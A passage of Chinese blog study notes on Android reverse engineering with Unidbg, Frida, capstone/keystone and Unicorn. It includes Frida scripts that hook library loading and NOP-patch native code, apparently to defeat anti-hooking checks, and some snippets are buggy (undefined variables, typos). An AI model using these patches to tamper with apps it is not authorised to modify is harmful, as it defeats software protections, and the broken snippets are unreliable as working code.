class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="结果转化为base64编码形式"><a href="#结果转化为base64编码形式" class="headerlink" title="结果转化为base64编码形式"></a>结果转化为base64编码形式</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Number</span> <span class="variable">number</span> <span class="operator">=</span> <span class="keyword">module</span>.callFunction(emulator, <span class="number">0x1b1cd</span>, list.toArray());</span><br><span class="line">        <span class="type">ByteArray</span> <span class="variable">resultArr</span> <span class="operator">=</span> vm.getObject(number.intValue());</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(resultArr.getValue());</span><br></pre></td></tr></table></figure><h3 id="UTF-8编码"><a href="#UTF-8编码" class="headerlink" title="UTF-8编码"></a>UTF-8编码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Number</span> <span class="variable">number</span> <span class="operator">=</span> <span class="keyword">module</span>.callFunction(emulator, <span class="number">0x1a981</span>, list.toArray());</span><br><span class="line"><span class="type">ByteArray</span> <span class="variable">resultArr</span> <span class="operator">=</span> vm.getObject(number.intValue());</span><br><span class="line"><span class="type">String</span> <span class="variable">md5result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(resultArr.getValue(), StandardCharsets.UTF_8);</span><br><span class="line">System.out.println(<span class="string">&quot;md5result:&quot;</span>+md5result);</span><br></pre></td></tr></table></figure><h2 id="Unidbg处理so与系统的交互"><a href="#Unidbg处理so与系统的交互" class="headerlink" title="Unidbg处理so与系统的交互"></a>Unidbg处理so与系统的交互</h2><h3 id="文件访问"><a href="#文件访问" class="headerlink" title="文件访问"></a>文件访问</h3><p>unidbg的文件系统创建的目录在/tmp/rootfs/default</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//读取自己的maps文件</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">xxx</span> <span class="keyword">extends</span> <span class="title class_">AbstractJni</span> <span class="keyword">implements</span> <span class="title class_">IOResolver</span>&#123;   <span class="comment">//实现一个接口方法  </span></span><br><span class="line">    emulator = AndroidEmulatorBuilder   <span class="comment">//构建模拟器实例</span></span><br><span class="line">                .for32Bit()</span><br><span class="line">        <span class="comment">//将该目录设置为根路径</span></span><br><span class="line">        .setRootDir(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;../../filesystem&quot;</span>))</span><br><span class="line">                <span class="comment">//添加DynarmicFactory后端工厂，为true含义：如果出现问题 退回Unicorn工厂</span></span><br><span class="line">                .addBackendFactory(<span class="keyword">new</span> <span class="title class_">DynarmicFactory</span>(<span class="literal">true</span>))</span><br><span class="line">                .build();</span><br><span class="line">    <span class="comment">//将当前类的实例对象作为IOResolver进行添加</span></span><br><span class="line">    emulator.getSyscallHandler().addIOResolver(<span class="built_in">this</span>);</span><br><span class="line">    ...</span><br><span class="line">        </span><br><span class="line">    <span class="comment">//读取文件就会执行resolver方法</span></span><br><span class="line">    <span class="keyword">public</span> FileResult <span class="title function_">resolver</span><span class="params">(Emulator emulator,String pathname,<span class="type">int</span> oflags)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>((pathname).equals(<span class="string">&quot;/proc/self/maps&quot;</span>))&#123;</span><br><span class="line">            <span class="comment">//将文件重定向到自己想要的位置</span></span><br><span class="line">            File reg=<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(!reg.exists())&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    reg.createNewFile();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span>(IOException e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                     &#125;</span><br><span class="line">            &#125;</span><br><span class="line">               </span><br><span class="line">            </span><br><span class="line">            <span class="keyword">return</span> FileResult.success(<span class="keyword">new</span> <span class="title class_">SimpleFileIO</span>(oflags,reg,pathname)); <span class="comment">//文件方式返回</span></span><br><span class="line">            <span class="keyword">return</span> FileResult.success(<span class="keyword">new</span> <span class="title class_">ByteArrayFileIO</span>(oflag,pathname,<span class="string">&quot;xxx&quot;</span>.getbytes)); <span class="comment">//字符串常量返回</span></span><br><span class="line">&#125;</span><br><span class="line">        System.out.println(pathname);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="看雪3w"><a href="#看雪3w" class="headerlink" title="看雪3w"></a>看雪3w</h1><h2 id="第一课时"><a href="#第一课时" class="headerlink" title="第一课时"></a>第一课时</h2><h3 id="capstone和keystone基本使用"><a href="#capstone和keystone基本使用" class="headerlink" title="capstone和keystone基本使用"></a>capstone和keystone基本使用</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> keystone</span><br><span class="line">CODE = <span class="string">b&quot;\x55\x48\x8b\x05\xb8\x13\x00\x00&quot;</span></span><br><span class="line">md = Cs(CS_ARCH_X86, CS_MODE_64)</span><br><span class="line"><span class="comment">#ks=Ks(CODE_ARCH_X86,KS_MODE_64)</span></span><br><span class="line">kp = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_64)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> md.disasm(CODE,<span class="number">0</span>,<span class="built_in">len</span>(CODE)):</span><br><span class="line">    <span class="comment">#print(i)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;0x%x:\t%s\t%s&quot;</span> % (i.address, i.mnemonic, i.op_str))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;--------------------------------&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(kp.asm(i.mnemonic+<span class="string">&quot; &quot;</span>+i.op_str))</span><br><span class="line">    </span><br><span class="line">capstone另一种写法</span><br><span class="line">//Capstone cs=new Capstone(Capstone.CS_ARCH_ARM,Capstone.CS_MODE_THUMB);</span><br><span class="line">Instruction[] disasm=cs.disasm(code,address);</span><br><span class="line"><span class="keyword">for</span>(Instruction i:disasm)&#123;</span><br><span class="line">    System.out.<span class="built_in">print</span>(String.<span class="built_in">format</span>(<span class="string">&quot;0x%x:%s %s&quot;</span>,i.getAddress(),i.getMnemonic(),i.getOpStr()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="利用frida内嵌的capstone"><a href="#利用frida内嵌的capstone" class="headerlink" title="利用frida内嵌的capstone"></a><strong>利用frida内嵌的capstone</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">dis</span>(<span class="params">address,number</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;number;i++)&#123;</span><br><span class="line">        <span class="keyword">var</span> ins=<span class="title class_">Instruction</span>.<span class="title function_">parse</span>(address);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;address:&quot;</span>+ins.<span class="property">address</span>+<span class="string">&quot;--dis:&quot;</span>+ins.<span class="title function_">toString</span>());</span><br><span class="line">        address=ins.<span class="property">next</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h3 id="动态进行patch"><a href="#动态进行patch" class="headerlink" title="动态进行patch"></a>动态进行patch</h3><p>当hook 这个.so文件时进程被终端 所以使用dlopen先加载这个libnative-lib.so文件,在patch</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">dis</span>(<span class="params">address,number</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;number;i++)&#123;</span><br><span class="line">        <span class="keyword">var</span> ins=<span class="title class_">Instruction</span>.<span class="title function_">parse</span>(address);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;address:&quot;</span>+ins.<span class="property">address</span>+<span class="string">&quot;--dis:&quot;</span>+ins.<span class="title function_">toString</span>());</span><br><span class="line">        address=ins.<span class="property">next</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest6</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> android_dlopen_ext = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="literal">null</span>, <span class="string">&quot;android_dlopen_ext&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(android_dlopen_ext);</span><br><span class="line">    <span class="keyword">if</span>(android_dlopen_ext != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(android_dlopen_ext,&#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">                <span class="keyword">var</span> soName = args[<span class="number">0</span>].<span class="title function_">readCString</span>();  <span class="comment">//dlopen函数第一个参数是.so路径</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(soName);</span><br><span class="line">                <span class="keyword">if</span>(soName.<span class="title function_">indexOf</span>(<span class="string">&quot;libnative-lib.so&quot;</span>) != -<span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="variable language_">this</span>.<span class="property">hook</span> = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">hook</span>) &#123; <span class="title function_">hook</span>() &#125;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> libnativemodule = <span class="title class_">Process</span>.<span class="title function_">getModuleByName</span>(<span class="string">&quot;libnative-lib.so&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> base = libnativemodule.<span class="property">base</span>;</span><br><span class="line">    <span class="title function_">dis</span>(base.<span class="title function_">add</span>(<span class="number">0x92B6</span>).<span class="title function_">add</span>(<span class="number">1</span>), <span class="number">10</span>);</span><br><span class="line">    <span class="title class_">Memory</span>.<span class="title function_">protect</span>(base.<span class="title function_">add</span>(<span class="number">0x92C2</span>),<span class="number">4</span>,<span class="string">&quot;rwx&quot;</span>);</span><br><span class="line">    <span class="comment">//或者使用frida内置keystone代替上面两行代码</span></span><br><span class="line">        <span class="keyword">var</span> patchaddr=base.<span class="title function_">add</span>(<span class="number">0x92C2</span>);</span><br><span class="line">        <span class="title class_">Memory</span>.<span class="title function_">patchCode</span>(patchaddr, <span class="number">4</span>, <span class="function"><span class="params">patchaddr</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">var</span> cw = <span class="keyword">new</span> <span class="title class_">ThumbWriter</span>(patchaddr);</span><br><span class="line">            cw.<span class="title function_">putNop</span>();</span><br><span class="line">            cw = <span class="keyword">new</span> <span class="title class_">ThumbWriter</span>(patchaddr.<span class="title function_">add</span>(<span class="number">2</span>));</span><br><span class="line">            cw.<span class="title function_">putNop</span>();</span><br><span class="line">            cw.<span class="title function_">flush</span>();</span><br><span class="line">        &#125;);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//修改为nopnop</span></span><br><span class="line">    base.<span class="title function_">add</span>(<span class="number">0x92C2</span>).<span class="title function_">writeByteArray</span>([<span class="number">0x00</span>,<span class="number">0xbf</span>,<span class="number">0x00</span>,<span class="number">0xbf</span>]);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;--------------------------------&quot;</span>);</span><br><span class="line">    <span class="title function_">dis</span>(base.<span class="title function_">add</span>(<span class="number">0x92B6</span>).<span class="title function_">add</span>(<span class="number">1</span>), <span class="number">10</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;+++++++++++++++++++++++++++++++&quot;</span>);</span><br><span class="line">    <span class="title function_">dis</span>(base.<span class="title function_">add</span>(<span class="number">0x948E</span>).<span class="title function_">add</span>(<span class="number">1</span>), <span class="number">10</span>);</span><br><span class="line">    <span class="title class_">Memory</span>.<span class="title function_">protect</span>(base.<span class="title function_">add</span>(<span class="number">0x9498</span>),<span class="number">4</span>,<span class="string">&quot;rwx&quot;</span>);</span><br><span class="line">    base.<span class="title function_">add</span>(<span class="number">0x9498</span>).<span class="title function_">writeByteArray</span>([<span class="number">0x00</span>,<span class="number">0xbf</span>,<span class="number">0x00</span>,<span class="number">0xbf</span>]);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;========================&quot;</span>);</span><br><span class="line">    <span class="title function_">dis</span>(base.<span class="title function_">add</span>(<span class="number">0x948E</span>).<span class="title function_">add</span>(<span class="number">1</span>), <span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(hookTest6);</span><br></pre></td></tr></table></figure><p>也可以hooklinker找到call_function函数，hook他的参数==&gt;加载so路径</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">dis</span>(<span class="params">address,number</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;number;i++)&#123;</span><br><span class="line">        <span class="keyword">var</span> ins=<span class="title class_">Instruction</span>.<span class="title function_">parse</span>(address);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;address:&quot;</span>+ins.<span class="property">address</span>+<span class="string">&quot;--dis:&quot;</span>+ins.<span class="title function_">toString</span>());</span><br><span class="line">        address=ins.<span class="property">next</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> linkermodule = <span class="title class_">Process</span>.<span class="title function_">getModuleByName</span>(<span class="string">&quot;linker&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> call_function_addr = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">var</span> symbols = linkermodule.<span class="title function_">enumerateSymbols</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; symbols.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> symbol = symbols[i];</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(symbol.<span class="property">name</span>);</span><br><span class="line">        <span class="comment">//LogPrint(linkername + &quot;-&gt;&quot; + symbol.name + &quot;---&quot; + symbol.address);</span></span><br><span class="line">        <span class="keyword">if</span> (symbol.<span class="property">name</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;__dl__ZL13call_functionPKcPFviPPcS2_ES0_&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">            call_function_addr = symbol.<span class="property">address</span>;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(call_function_addr);</span><br><span class="line">            <span class="comment">//LogPrint(&quot;linker-&gt;&quot; + symbol.name + &quot;---&quot; + symbol.address)</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(call_function_addr,&#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> type = <span class="title function_">ptr</span>(args[<span class="number">0</span>]).<span class="title function_">readUtf8String</span>();</span><br><span class="line">            <span class="keyword">var</span> address = args[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">var</span> sopath = <span class="title function_">ptr</span>(args[<span class="number">2</span>]).<span class="title function_">readUtf8String</span>();</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;loadso:&quot;</span> + sopath + <span class="string">&quot;--addr:&quot;</span> + address + <span class="string">&quot;--type:&quot;</span> + type);</span><br><span class="line">            <span class="keyword">if</span> (sopath.<span class="title function_">indexOf</span>(<span class="string">&quot;libnative-lib.so&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> libnativemodule = <span class="title class_">Process</span>.<span class="title function_">getModuleByName</span>(<span class="string">&quot;libnative-lib.so&quot;</span>);</span><br><span class="line">                <span class="keyword">var</span> base = libnativemodule.<span class="property">base</span>;</span><br><span class="line">                <span class="title function_">dis</span>(base.<span class="title function_">add</span>(<span class="number">0x8D8E</span>).<span class="title function_">add</span>(<span class="number">1</span>), <span class="number">10</span>);</span><br><span class="line">                <span class="title class_">Memory</span>.<span class="title function_">protect</span>(base_addr.<span class="title function_">add</span>(<span class="number">0x93CE</span>).<span class="title function_">add</span>(<span class="number">1</span>),<span class="number">4</span>,<span class="string">&quot;rxw&quot;</span>);</span><br><span class="line">                base_addr.<span class="title function_">add</span>(<span class="number">0x93CE</span>).<span class="title function_">writeByteArray</span>([<span class="number">0x00</span>,<span class="number">0xbf</span>,<span class="number">0x00</span>,<span class="number">0xbf</span>]);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;--------------------------------&quot;</span>)</span><br><span class="line">                <span class="title function_">dis</span>(base.<span class="title function_">add</span>(<span class="number">0x8D8E</span>).<span class="title function_">add</span>(<span class="number">1</span>), <span class="number">10</span>);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;+++++++++++++++++++++++++++++++&quot;</span>)</span><br><span class="line">                <span class="title function_">dis</span>(base.<span class="title function_">add</span>(<span class="number">0x93C2</span>).<span class="title function_">add</span>(<span class="number">1</span>), <span class="number">10</span>);</span><br><span class="line">                <span class="title class_">Memory</span>.<span class="title function_">protect</span>(base_addr.<span class="title function_">add</span>(<span class="number">0x949E</span>).<span class="title function_">add</span>(<span class="number">1</span>),<span class="number">4</span>,<span class="string">&quot;rxw&quot;</span>);</span><br><span class="line">                base_addr.<span class="title function_">add</span>(<span class="number">0x949E</span>).<span class="title function_">writeByteArray</span>([<span class="number">0x00</span>,<span class="number">0xbf</span>,<span class="number">0x00</span>,<span class="number">0xbf</span>]);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;========================&quot;</span>);</span><br><span class="line">                <span class="title function_">dis</span>(base.<span class="title function_">add</span>(<span class="number">0x93C2</span>).<span class="title function_">addad</span>(<span class="number">1</span>), <span class="number">10</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">          &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(hook);</span><br></pre></td></tr></table></figure><h2 id="第二课时"><a href="#第二课时" class="headerlink" title="第二课时"></a>第二课时</h2><h3 id="unicorn简单模拟执行-add-R0-R1"><a href="#unicorn简单模拟执行-add-R0-R1" class="headerlink" title="unicorn简单模拟执行 add R0,R1"></a>unicorn简单模拟执行 add R0,R1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="comment">#.text:00012836 08 44                       ADD             R0, R1  ; Rd = Op1 + Op2</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printArm32Reg</span>(<span class="params">mu</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">66</span>,<span class="number">79</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;R%d,value:%x&quot;</span>%(i-<span class="number">66</span>,mu.reg_read(i))) <span class="comment">#利用寄存器序号输出寄存器的内容</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">testthumb</span>():</span><br><span class="line">    CODE=<span class="string">b&#x27;\x08\x44&#x27;</span></span><br><span class="line">    cp=Cs(CS_ARCH_ARM,CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(CODE,<span class="number">0</span>,<span class="built_in">len</span>(CODE)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[addr:%x]:%s %s\n&quot;</span>%(i.address,i.mnemonic,i.op_str))</span><br><span class="line">    mu=Uc(UC_ARCH_ARM,UC_MODE_THUMB)</span><br><span class="line">    address=<span class="number">0x1000</span></span><br><span class="line">    size=<span class="number">1024</span></span><br><span class="line">    mu.mem_map(address,size)</span><br><span class="line">    mu.mem_write(address,CODE)</span><br><span class="line">    <span class="built_in">bytes</span>=mu.mem_read(address,size) <span class="comment">#这个函数返回bytearray类型</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ADDRESS:%x,content:%s&quot;</span>%(address,binascii.b2a_hex(<span class="built_in">bytes</span>)))  <span class="comment">#转化为十六进制形式</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R0,<span class="number">0x100</span>)</span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R1,<span class="number">0x200</span>)</span><br><span class="line">    printArm32Reg(mu)</span><br><span class="line">    mu.emu_start(address+<span class="number">1</span>,address+<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;模拟执行后寄存器内容-----------&quot;</span>)</span><br><span class="line">    printArm32Reg(mu)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    testthumb()</span><br></pre></td></tr></table></figure><h3 id="Unicorn的hook"><a href="#Unicorn的hook" class="headerlink" title="Unicorn的hook"></a>Unicorn的hook</h3><p><img src="2025-01-15-Unidbg/image-20240504204827496.png" alt="image-20240504204827496"></p><h4 id="UC-HOOK-CODE"><a href="#UC-HOOK-CODE" class="headerlink" title="UC_HOOK_CODE"></a>UC_HOOK_CODE</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printArm32Reg</span>(<span class="params">mu</span>):    <span class="comment">#打印ARM32下的所有寄存器内容</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">66</span>,<span class="number">79</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;R%d,value:%x&quot;</span>%(i-<span class="number">66</span>,mu.reg_read(i)))</span><br><span class="line">        </span><br><span class="line"><span class="comment">#typedef void (*uc_cb_hookcode_t)(uc_engine *uc, uint64_t address, uint32_t size, void *user_data);     </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">mu,address,size,user_data</span>):  <span class="comment">#定义的回调函数</span></span><br><span class="line">    code=mu.mem_read(address,size)</span><br><span class="line">    cp = Cs(CS_ARCH_ARM, CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(code, <span class="number">0</span>, <span class="built_in">len</span>(code)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[addr:%x]:%s %s\n&quot;</span> % (address, i.mnemonic, i.op_str))</span><br><span class="line">    <span class="built_in">print</span>(<span 